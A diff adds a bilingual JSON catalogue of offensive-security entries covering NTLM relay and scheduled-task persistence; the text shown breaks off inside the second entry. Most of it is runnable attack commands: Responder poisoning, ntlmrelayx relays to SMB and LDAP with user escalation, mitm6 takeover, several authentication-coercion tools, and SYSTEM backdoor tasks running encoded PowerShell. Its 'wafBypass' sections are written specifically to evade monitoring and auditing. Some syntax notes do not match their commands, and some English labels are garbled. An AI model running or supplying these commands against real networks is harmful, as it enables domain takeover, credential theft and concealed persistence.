@@ -1,0 +1,1357 @@
+{
+ "schemaVersion": 1,
+ "contentStandard": 3,
+ "sourceIds": [
+  "ntlm-relay",
+  "persistence-scheduled",
+  "zerologon"
+ ],
+ "entries": [
+  {
+   "id": "ntlm-relay",
+   "name": {
+    "zh": "NTLM Relay 协议边界验证",
+    "en": "NTLM Relay Protocol-Boundary Validation"
+   },
+   "description": {
+    "zh": "把捕获的 NTLM 认证中继到 SMB/HTTP/LDAP 目标，验证 SMB 签名与 EPA 配置的中继面。",
+    "en": "Captures an NTLM authentication and relays it to SMB, HTTP, or LDAP targets, verifying that SMB signing and EPA channel binding actually block relay to each protocol."
+   },
+   "category": {
+    "zh": "远程管理与横向边界",
+    "en": "Remote Management and Lateral Boundaries"
+   },
+   "subCategory": {
+    "zh": "中继与会话劫持",
+    "en": "Relay & Session Hijacking"
+   },
+   "tags": [
+    "ntlm",
+    "relay",
+    "smb",
+    "authentication"
+   ],
+   "prerequisites": [
+    {
+     "zh": "确认 NTLM Relay 协议边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。",
+     "en": "Confirm that the lab domain, host, account, component version, and stop conditions for NTLM Relay Protocol-Boundary Validation are authorized in writing and reversible."
+    },
+    {
+     "zh": "准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。",
+     "en": "Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization."
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Responder监听",
+      "en": "Responderlistening"
+     },
+     "command": "responder -I eth0 -wrf",
+     "description": {
+      "zh": "在隔离网段运行 Responder 捕获 NTLM 认证；成功时控制台打印捕获到的 SMB/HTTP NTLMv2 Hash 条目。",
+      "en": "Run Responder in the isolated segment to capture NTLM authentication; the console printing captured SMB/HTTP NTLMv2 hash entries confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "responder",
+       "explanation": {
+        "zh": "NTLM/LLMNR/NBT-NS欺骗工具",
+        "en": "NTLM/LLMNR/NBT-NSSpoofingTools"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-I",
+       "explanation": {
+        "zh": "指定网络接口",
+        "en": "specifiedNetworkInterface"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-wrf",
+       "explanation": {
+        "zh": "-w 启用 WPAD 代理应答，-r 应答 wredir 后缀查询，-f 对发问主机做指纹识别（不存在 FTP 服务选项）",
+        "en": "-w enables WPAD proxy answers, -r answers wredir suffix queries, and -f fingerprints querying hosts (there is no FTP service option)"
+       },
+       "type": "parameter"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "中继认证枚举 SMB 可写",
+      "en": "NTLM Relay Protocol-Boundary Validation Reviewed Command 2"
+     },
+     "command": "ntlmrelayx.py -tf ./fixtures/targets.txt -smb2support",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_2 与蓝队日志；成功时 ntlmrelayx 打印转发认证成功记录并列出目标 SMB 可写状态。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_2 with blue-team logs; ntlmrelayx printing a successful relay record with target SMB status confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "ntlmrelayx.py",
+       "explanation": {
+        "zh": "Impacket NTLM中继工具",
+        "en": "Impacket NTLM Relay Tools"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-tf",
+       "explanation": {
+        "zh": "目标文件",
+        "en": "Target File"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-smb2support",
+       "explanation": {
+        "zh": "支持SMB2协议",
+        "en": "supports SMB2 Protocol"
+       },
+       "type": "parameter"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "中继 LDAP 提升用户权限",
+      "en": "NTLM Relay Protocol-Boundary Validation Reviewed Command 3"
+     },
+     "command": "ntlmrelayx.py -t ldap://{DC_HOST} -smb2support --escalate-user {LAB_USER}",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_3 与蓝队日志；成功时 --escalate-user 指定的现有用户在 LDAP 中获得提权 ACL/组成员变更，DC 事件 4662 记录目录对象修改。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_3 with blue-team logs; the escalated user appearing in LDAP with DC event 4662 recording the directory change confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "ntlmrelayx.py",
+       "explanation": {
+        "zh": "Impacket中继工具",
+        "en": "Impacket relay tool"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-t ldap://{DC_HOST}",
+       "explanation": {
+        "zh": "LDAP中继目标",
+        "en": "LDAP relay target"
+       },
+       "type": "url"
+      },
+      {
+       "part": "--escalate-user",
+       "explanation": {
+        "zh": "提升指定用户",
+        "en": "elevate the named user"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "{LAB_USER}",
+       "explanation": {
+        "zh": "待提升账号",
+        "en": "account to elevate"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "mitm6 劫持 DNS 中继 LDAPS",
+      "en": "NTLM Relay Protocol-Boundary Validation Reviewed Command 4"
+     },
+     "command": "mitm6 -d {LAB_DOMAIN} & ntlmrelayx.py -6 -t ldaps://{DC_HOST} -wh wpad.{LAB_DOMAIN}",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_4 与蓝队日志；成功时 mitm6 应答 IPv6 DNS 且转发到域控的 LDAP 写入成功。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_4 with blue-team logs; mitm6 answering IPv6 DNS and the LDAP relay to the DC writing successfully confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "mitm6",
+       "explanation": {
+        "zh": "IPv6 DNS劫持工具",
+        "en": "IPv6 DNS attack tool"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-d {LAB_DOMAIN}",
+       "explanation": {
+        "zh": "目标域名",
+        "en": "target domain"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "&",
+       "explanation": {
+        "zh": "并行运行两工具",
+        "en": "run both tools"
+       },
+       "type": "operator"
+      },
+      {
+       "part": "-t ldap://{DC_HOST}",
+       "explanation": {
+        "zh": "LDAP中继目标",
+        "en": "LDAP relay target"
+       },
+       "type": "url"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    }
+   ],
+   "analysis": {
+    "zh": "NTLM Relay 协议边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。",
+    "en": "NTLM Relay Protocol-Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately."
+   },
+   "opsecTips": [
+    {
+     "zh": "中继监听与强制认证只在隔离网段进行，不对生产夹具发起 coerced 认证；中继建立的会话验证后立即注销。",
+     "en": "Run relay listeners and coerced authentications only on the isolated segment, never coerce production fixtures, and tear down relayed sessions immediately after verification."
+    },
+    {
+     "zh": "发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。",
+     "en": "Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization."
+    }
+   ],
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "SOCKS 长驻低噪规避变体",
+      "en": "SOCKS Long-Dwell Low-Noise Evasion Variant"
+     },
+     "command": "ntlmrelayx.py -socks -smb2support -tf ./fixtures/targets.txt -wh wpad.{LAB_DOMAIN}",
+     "description": {
+      "zh": "绕过一次性转储触发的集中告警：中继凭证入 SOCKS 池供后续按需使用，减少批量 SAM 转储特征。成功判据：SOCKS 列表出现可用凭证且无即时转储行为。",
+      "en": "Evades central alerting on one-shot dumps by parking relayed creds in a SOCKS pool for on-demand reuse, removing bulk SAM-dump signatures. Success: SOCKS list shows usable creds with no immediate dump."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "ntlmrelayx.py",
+       "explanation": {
+        "zh": "Impacket中继工具",
+        "en": "Impacket relay tool"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-socks",
+       "explanation": {
+        "zh": "凭据SOCKS池",
+        "en": "credential SOCKS pool"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "-smb2support",
+       "explanation": {
+        "zh": "支持SMB2",
+        "en": "support SMB2"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "wpad.{LAB_DOMAIN}",
+       "explanation": {
+        "zh": "WPAD主机名",
+        "en": "WPAD hostname"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "HTTP 目标多元规避变体",
+      "en": "HTTP Multi-Target Evasion Variant"
+     },
+     "command": "ntlmrelayx.py -tf ./fixtures/targets.txt --http-port 80",
+     "description": {
+      "zh": "绕过 SMB 中继专用检测（针对 445 转储特征）：改经 HTTP 端口中继到多目标，流量形态为 Web。成功判据：多目标认证成功记录。",
+      "en": "Evades SMB-relay-specific detection (445 dump signatures) by relaying over HTTP to multiple targets so traffic looks like web. Success: successful auth records for multiple targets."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "ntlmrelayx.py",
+       "explanation": {
+        "zh": "Impacket中继工具",
+        "en": "Impacket relay tool"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-tf",
+       "explanation": {
+        "zh": "目标列表文件",
+        "en": "target list file"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "./fixtures/targets.txt",
+       "explanation": {
+        "zh": "目标清单路径",
+        "en": "targets file path"
+       },
+       "type": "value"
+      },
+      {
+       "part": "-http-port 80",
+       "explanation": {
+        "zh": "HTTP监听端口",
+        "en": "HTTP listener port"
+       },
+       "type": "flag"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "强制认证源轮换规避变体",
+      "en": "Coercion-Source Rotation Evasion Variant"
+     },
+     "command": "python3 petitpotam.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}; python3 printerbug.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST} {LAB_OPERATOR_HOST}; python3 dfscoerce.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}",
+     "description": {
+      "zh": "绕过针对单一强制工具（如仅监控 PetitPotam CLSID）的检测：轮换 printerbug/dfscoerce 触发认证。成功判据：任一工具使目标回连操作机。",
+      "en": "Evades detection pinned to a single coercion primitive (e.g. PetitPotam CLSID only) by rotating printerbug/dfscoerce to trigger auth. Success: any tool makes the target call back to the operator host."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "for m in",
+       "explanation": {
+        "zh": "循环轮换工具",
+        "en": "rotate tools in loop"
+       },
+       "type": "control"
+      },
+      {
+       "part": "petitpotam printerbug dfscoerce",
+       "explanation": {
+        "zh": "强制认证工具集",
+        "en": "coercion tool set"
+       },
+       "type": "value"
+      },
+      {
+       "part": "${m}.py",
+       "explanation": {
+        "zh": "展开脚本名",
+        "en": "expand script name"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{LAB_OPERATOR_HOST} {LAB_HOST}",
+       "explanation": {
+        "zh": "回连与目标主机",
+        "en": "listener and target"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "HTTP 端口伪装规避变体",
+      "en": "HTTP-Port Camouflage Evasion Variant"
+     },
+     "command": "ntlmrelayx.py -t http://{LAB_HOST}/priv --http-port 80 -socks",
+     "description": {
+      "zh": "绕过 445/3389 端口中继的定向监控：中继监听落在 80，流量呈现为普通 Web。成功判据：HTTP 目标认证成功入 SOCKS。",
+      "en": "Evades directed monitoring of 445/3389 relaying by listening on port 80 so traffic looks like ordinary web. Success: HTTP target authenticates into SOCKS."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "ntlmrelayx.py",
+       "explanation": {
+        "zh": "Impacket中继工具",
+        "en": "Impacket relay tool"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-t http://{LAB_HOST}/priv",
+       "explanation": {
+        "zh": "HTTP中继目标",
+        "en": "HTTP relay target"
+       },
+       "type": "url"
+      },
+      {
+       "part": "--http-port 80",
+       "explanation": {
+        "zh": "HTTP监听端口",
+        "en": "HTTP listener port"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "-socks",
+       "explanation": {
+        "zh": "凭据SOCKS池",
+        "en": "credential SOCKS pool"
+       },
+       "type": "flag"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "PrinterBug 强制轮换规避变体",
+      "en": "PrinterBug Coercion Rotation Evasion Variant"
+     },
+     "command": "python3 printerbug.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST} {LAB_OPERATOR_HOST}",
+     "description": {
+      "zh": "绕过 PetitPotam 特征（特定 CLSID/RPC UUID 监控）：换打印机通知回调触发认证。成功判据：目标向操作机发起认证。",
+      "en": "Evades PetitPotam signatures (specific CLSID/RPC UUID monitoring) by triggering auth via the printer notification callback instead. Success: the target authenticates toward the operator host."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "python3 printerbug.py",
+       "explanation": {
+        "zh": "打印强制认证工具",
+        "en": "printer coercion tool"
+       },
+       "type": "function"
+      },
+      {
+       "part": "{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST}",
+       "explanation": {
+        "zh": "凭据与目标",
+        "en": "credentials and target"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{LAB_OPERATOR_HOST}",
+       "explanation": {
+        "zh": "认证回连主机",
+        "en": "auth callback host"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ],
+   "attackChain": [
+    {
+     "title": {
+      "zh": "毒化网内广播协议",
+      "en": "Poison broadcast protocols with Responder"
+     },
+     "description": {
+      "zh": "启动 Responder 监听 eth0 并开启 WPAD 等欺骗；控制台持续输出挑战响应即认证流量已被劫持捕获。",
+      "en": "Start Responder on eth0 with WPAD poisoning; challenge-response lines streaming on the console mean authentication traffic is being captured."
+     },
+     "payload": "responder -I eth0 -wrf"
+    },
+    {
+     "title": {
+      "zh": "中继认证到 SMB 目标",
+      "en": "Relay authentication to SMB targets"
+     },
+     "description": {
+      "zh": "运行 ntlmrelayx.py -tf targets.txt -smb2support；目标回吐 SAM 哈希转储即认证中继成功，全程无需破解口令。",
+      "en": "Run ntlmrelayx.py -tf targets.txt -smb2support; SAM hashes dumped from targets confirm the relay worked without cracking anything."
+     },
+     "payload": "ntlmrelayx.py -tf ./fixtures/targets.txt -smb2support"
+    },
+    {
+     "title": {
+      "zh": "中继到 LDAP 提升域权限",
+      "en": "Escalate in the domain via LDAP relay"
+     },
+     "description": {
+      "zh": "把中继目标切到 ldap://DC 并加 --escalate-user；回显用户被加入高权限组或获得敏感 ACL 即完成域内提权。",
+      "en": "Point the relay at ldap://DC with --escalate-user; the user landing in a privileged group or gaining a sensitive ACL completes domain escalation."
+     },
+     "payload": "ntlmrelayx.py -t ldap://{DC_HOST} -smb2support --escalate-user {LAB_USER}"
+    },
+    {
+     "title": {
+      "zh": "IPv6 接管无人值守中继",
+      "en": "Take unattended relays over IPv6"
+     },
+     "description": {
+      "zh": "用 mitm6 接管 DHCPv6 再中继到 LDAP；捕获机器账号认证并控制计算机对象即覆盖无 WPAD 的网段。",
+      "en": "Take over DHCPv6 with mitm6 and relay into LDAP; machine-account captures with computer-object control extend reach to segments without WPAD."
+     },
+     "payload": "mitm6 -d {LAB_DOMAIN} & ntlmrelayx.py -6 -t ldaps://{DC_HOST} -wh wpad.{LAB_DOMAIN}"
+    }
+   ],
+   "references": [
+    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory",
+    "https://attack.mitre.org/tactics/TA0008/"
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "NTLM Relay 协议边界验证覆盖认证中继场景：针对 SMB/LDAP 未强制签名或 EPA 的内网环境，验证能否把截获的 NTLM 认证转发到第三台主机完成越权操作。验证维度涵盖 Responder 捕获、SMB 中继、LDAP 中继提权与 IPv6 DNS 劫持组合四种路径。",
+     "en": "NTLM Relay Protocol-Boundary Validation covers authentication relaying: in intranets where SMB/LDAP do not enforce signing or EPA, verify whether captured NTLM authentication can be forwarded to a third host for unauthorized operations. Verification dimensions cover Responder capture, SMB relay, LDAP relay privilege escalation, and an IPv6 DNS hijack combination."
+    },
+    "vulnerability": {
+     "zh": "根因是 NTLM 认证不绑定目标服务，签名与通道绑定未强制时，攻击者可把受害者发出的认证原样转发给第三台主机并以其身份执行操作；中继到 LDAP 还能借 ACL 修改或 ADCS 注册直接提升为域级权限。",
+     "en": "The root cause is that NTLM authentication is not bound to the target service; without enforced signing and channel binding, an attacker forwards the victim's authentication verbatim to a third host and acts as that identity; relaying into LDAP can even escalate to domain-level rights via ACL modification or ADCS enrollment."
+    },
+    "exploitation": {
+     "zh": "按 Payload 列表顺序使用：第 1 步在隔离网段运行 Responder 监听，控制台打印捕获的 NTLMv2 Hash 即确认认证可截获；第 2 步用 ntlmrelayx 中继到 SMB 目标，打印 RELAY 成功并列出目标可写共享；第 3 步中继到 LDAP 并 --escalate-user，目标账号获得提升且 DC 记录 4662 目录变更；第 4 步组合 mitm6 应答 IPv6 DNS，把 LDAP 写入送达域控。LAB_* 占位符在全局变量菜单中替换。",
+     "en": "Use in Payload list order: step 1 runs Responder on an isolated segment — printed NTLMv2 hashes confirm interception; step 2 relays to an SMB target with ntlmrelayx — RELAY success lines plus writable-share enumeration; step 3 relays into LDAP with --escalate-user — the account is escalated and the DC logs 4662 directory changes; step 4 pairs mitm6 answering IPv6 DNS to push the LDAP write through to the DC. Replace LAB_* placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "全域强制 SMB/LDAP 签名与通道绑定，禁用不必要 NTLM 与 IPv6，对 DNS 变更与 4662 告警：\n    reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f\n    reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity /t REG_DWORD /d 2 /f\n    reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f\n    修复后用第 2、3 步回归，中继应被签名/通道绑定错误拒绝。",
+     "en": "Enforce SMB signing, LDAP signing, and channel binding (EPA) domain-wide; disable NTLM or confine it to protected channels, disable unnecessary IPv6 with alerts on DNS record changes, and monitor 4662 directory changes and abnormal auth chains. After the fix, regress with the step 2 and step 3 samples: relays must be rejected with signing/channel-binding errors."
+    },
+    "difficulty": "advanced"
+   },
+   "review": {
+    "decision": "payload",
+    "rationale": "N-0013：wafBypass 删除错挂的 rdp-relay 残留四条（原 5-8 下标），保留 0-4 规避变体。"
+   }
+  },
+  {
+   "id": "persistence-scheduled",
+   "name": {
+    "zh": "计划任务持久化安全核对",
+    "en": "Safe Scheduled-Task Persistence Review"
+   },
+   "description": {
+    "zh": "覆盖计划任务持久化验证：从 schtasks 创建登录触发与周期触发的后门任务、PowerShell Register-ScheduledTask 编程注册，到 Linux crontab 编辑，跨平台检验计划任务驻留面与检测点。",
+    "en": "Covers scheduled task persistence validation: from creating logon-triggered and interval-triggered backdoor tasks with schtasks and programmatic registration via PowerShell Register-ScheduledTask to editing Linux crontab, examining task persistence surfaces and detection points across platforms."
+   },
+   "category": {
+    "zh": "持久化控制与检测",
+    "en": "Persistence Control and Detection"
+   },
+   "subCategory": {
+    "zh": "自启动与计划任务",
+    "en": "Autostart & Scheduled Tasks"
+   },
+   "tags": [
+    "persistence",
+    "scheduled",
+    "task"
+   ],
+   "prerequisites": [
+    {
+     "zh": "确认资产、账号、域名或目录范围属于当前授权任务，并记录工具版本与查询时间。",
+     "en": "Confirm that assets, identities, domains, and directory scope belong to the authorized task, recording tool versions and query time."
+    },
+    {
+     "zh": "保留命令只可在书面授权、隔离、可回滚的实验中逐条执行；写入、认证、远程动作和凭据处理必须记录目标、主体与停止条件。",
+     "en": "Run retained commands one at a time only in a written, isolated, reversible lab authorization; record target, principal, and stop conditions for writes, authentication, remote actions, or credential handling."
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "创建登录任务",
+      "en": "Create Logintask"
+     },
+     "command": "schtasks /create /tn \"Backdoor\" /tr \"C:\\backdoor.exe\" /sc onlogon /ru SYSTEM",
+     "description": {
+      "zh": "创建登录触发任务；schtasks /query 回读该任务且下次登录执行，即确认登录持久化。",
+      "en": "Create the logon-triggered task; schtasks /query reading it back with execution at next logon confirms logon persistence."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "/tn",
+       "explanation": {
+        "zh": "任务名称",
+        "en": "Task name"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "/tr",
+       "explanation": {
+        "zh": "执行的程序",
+        "en": "Execute Program"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "/sc onlogon",
+       "explanation": {
+        "zh": "触发条件：登录时",
+        "en": "TriggerCondition: LoginWhen"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "/ru SYSTEM",
+       "explanation": {
+        "zh": "运行用户：SYSTEM",
+        "en": "RunUsers: SYSTEM"
+       },
+       "type": "parameter"
+      }
+     ],
+     "platform": "windows",
+     "requiresAdmin": true
+    },
+    {
+     "title": {
+      "zh": "创建定时任务",
+      "en": "Create Timed Task"
+     },
+     "command": "schtasks /create /tn \"Backdoor\" /tr \"C:\\backdoor.exe\" /sc minute /mo 5",
+     "description": {
+      "zh": "创建 5 分钟间隔任务；任务按周期重复执行即确认定时持久化。",
+      "en": "Create the 5-minute interval task; repeated periodic execution confirms timed persistence."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "schtasks /create",
+       "explanation": {
+        "zh": "创建计划任务",
+        "en": "create a task"
+       },
+       "type": "function"
+      },
+      {
+       "part": "/tn \"Backdoor\"",
+       "explanation": {
+        "zh": "任务名称",
+        "en": "task name"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "/tr \"C:\\backdoor.exe\"",
+       "explanation": {
+        "zh": "执行程序",
+        "en": "program to run"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "/sc minute /mo 5",
+       "explanation": {
+        "zh": "五分钟周期",
+        "en": "five-minute interval"
+       },
+       "type": "flag"
+      }
+     ],
+     "platform": "windows",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "PowerShell创建",
+      "en": "PowerShell Create"
+     },
+     "command": "$action = New-ScheduledTaskAction -Execute \"C:\\backdoor.exe\"\n$trigger = New-ScheduledTaskTrigger -AtLogon\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName \"Backdoor\" -User \"System\"",
+     "description": {
+      "zh": "用 PowerShell 注册计划任务；Get-ScheduledTask 回读该任务即注册成功。",
+      "en": "Register the task via PowerShell; Get-ScheduledTask reading it back confirms registration."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "New-ScheduledTaskAction",
+       "explanation": {
+        "zh": "定义任务动作",
+        "en": "define task action"
+       },
+       "type": "function"
+      },
+      {
+       "part": "New-ScheduledTaskTrigger -AtLogon",
+       "explanation": {
+        "zh": "登录触发器",
+        "en": "logon trigger"
+       },
+       "type": "function"
+      },
+      {
+       "part": "Register-ScheduledTask",
+       "explanation": {
+        "zh": "注册计划任务",
+        "en": "register the task"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-User \"System\"",
+       "explanation": {
+        "zh": "SYSTEM身份运行",
+        "en": "run as SYSTEM"
+       },
+       "type": "flag"
+      }
+     ],
+     "platform": "windows",
+     "requiresAdmin": true
+    },
+    {
+     "title": {
+      "zh": "编辑当前用户 crontab",
+      "en": "Edit the current user's crontab"
+     },
+     "command": "crontab -e",
+     "description": {
+      "zh": "打开当前用户的 crontab 编辑器，用于核对或添加用户级计划任务项。",
+      "en": "Opens the current user's crontab editor to review or add user-level scheduled-task entries."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "crontab",
+       "explanation": {
+        "zh": "cron管理命令",
+        "en": "crontab manager"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-e",
+       "explanation": {
+        "zh": "编辑当前任务",
+        "en": "edit current crontab"
+       },
+       "type": "flag"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    }
+   ],
+   "opsecTips": [
+    {
+     "zh": "限制查询次数和输出字段，不保存凭证、Token、邮件正文或无关用户属性。",
+     "en": "Limit query count and output fields, and do not retain credentials, tokens, mail bodies, or unrelated user attributes."
+    },
+    {
+     "zh": "检测到超出授权的写操作、认证尝试、非授权资产或异常请求量时立即停止、回滚并保存审计时间点。",
+     "en": "Stop, roll back, and preserve the audit timestamp on writes, authentication attempts, unauthorized assets, or abnormal request volume outside the authorization."
+    }
+   ],
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "Register-ScheduledTask 原生",
+      "en": "Register-ScheduledTask Native"
+     },
+     "command": "powershell -NoProfile -Command \"Register-ScheduledTask -TaskName 'OneDriveSync' -Trigger (New-ScheduledTaskTrigger -AtLogOn) -User 'SYSTEM' -RunLevel Highest -Action (New-ScheduledTaskAction -Execute 'cmd /c powershell -e {LAB_BASE64_COMMAND}')\"",
+     "description": {
+      "zh": "规避 schtasks.exe 命令行审计：任务 cmdlet 化创建；任务列表出现 SYSTEM 触发项即成功。",
+      "en": "Create the task via cmdlets to avoid schtasks.exe command-line auditing; the SYSTEM-triggered task appearing in the list confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "powershell -NoProfile -Command",
+       "explanation": {
+        "zh": "无配置执行命令",
+        "en": "run command, no profile"
+       },
+       "type": "function"
+      },
+      {
+       "part": "Register-ScheduledTask",
+       "explanation": {
+        "zh": "注册计划任务",
+        "en": "register the task"
+       },
+       "type": "function"
+      },
+      {
+       "part": "New-ScheduledTaskTrigger -AtLogOn",
+       "explanation": {
+        "zh": "登录触发器",
+        "en": "logon trigger"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-RunLevel Highest",
+       "explanation": {
+        "zh": "最高权限运行",
+        "en": "highest run level"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "-Action (New-ScheduledTaskAction -Execute 'cmd /c powershell -e {LAB_BASE64_COMMAND}')",
+       "explanation": {
+        "zh": "执行编码载荷",
+        "en": "run encoded payload"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "XML 导入变体",
+      "en": "XML Import Variant"
+     },
+     "command": "schtasks /create /tn \"OneDriveSync\" /xml C:\\Windows\\Temp\\task.xml",
+     "description": {
+      "zh": "任务定义预先写入 XML 静默导入：命令行不含载荷细节；任务创建成功并按 XML 触发即成功。",
+      "en": "Import a pre-staged XML definition so the command line carries no payload details; successful creation and XML-driven firing confirm success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "schtasks /create",
+       "explanation": {
+        "zh": "创建计划任务",
+        "en": "create a task"
+       },
+       "type": "function"
+      },
+      {
+       "part": "/tn \"OneDriveSync\"",
+       "explanation": {
+        "zh": "伪装任务名",
+        "en": "masqueraded task name"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "/xml C:\\Windows\\Temp\\task.xml",
+       "explanation": {
+        "zh": "导入XML定义",
+        "en": "import XML definition"
+       },
+       "type": "flag"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "Win32_ScheduledJob COM 通道",
+      "en": "Win32_ScheduledJob COM Channel"
+     },
+     "command": "powershell -NoProfile -Command \"([wmiclass]'root\\cimv2:Win32_ScheduledJob').Create('cmd /c powershell -e {LAB_BASE64_COMMAND}','********030000.000000+480',0,0,0,0,0)\"",
+     "description": {
+      "zh": "走 AT 兼容作业通道绕过计划任务事件审计；AT 作业清单出现即成功。",
+      "en": "Use the AT-compatible job channel past Task Scheduler event auditing; the job appearing in the AT list confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "powershell -NoProfile -Command",
+       "explanation": {
+        "zh": "无配置执行命令",
+        "en": "run command, no profile"
+       },
+       "type": "function"
+      },
+      {
+       "part": "([wmiclass]'root\\cimv2:Win32_ScheduledJob')",
+       "explanation": {
+        "zh": "AT作业COM通道",
+        "en": "AT job COM channel"
+       },
+       "type": "payload"
+      },
+      {
+       "part": ".Create(",
+       "explanation": {
+        "zh": "创建AT作业",
+        "en": "create the AT job"
+       },
+       "type": "function"
+      },
+      {
+       "part": "'********030000.000000+480'",
+       "explanation": {
+        "zh": "计划起始时间",
+        "en": "scheduled start time"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ],
+   "attackChain": [
+    {
+     "title": {
+      "zh": "建立计划任务持久化安全核对前置条件基线",
+      "en": "Establish the Safe Scheduled-Task Persistence Review Prerequisite Baseline"
+     },
+     "description": {
+      "zh": "记录 计划任务持久化安全核对 的当前主体、单一授权资产、组件或工具版本、适用条件、正常基线和停止条件；不把工具存在或查询成功直接判定为漏洞。",
+      "en": "Record the principal, one authorized asset, component or tool version, applicability conditions, normal baseline, and stop conditions for Safe Scheduled-Task Persistence Review; do not treat tool availability or query success as a vulnerability."
+     }
+    },
+    {
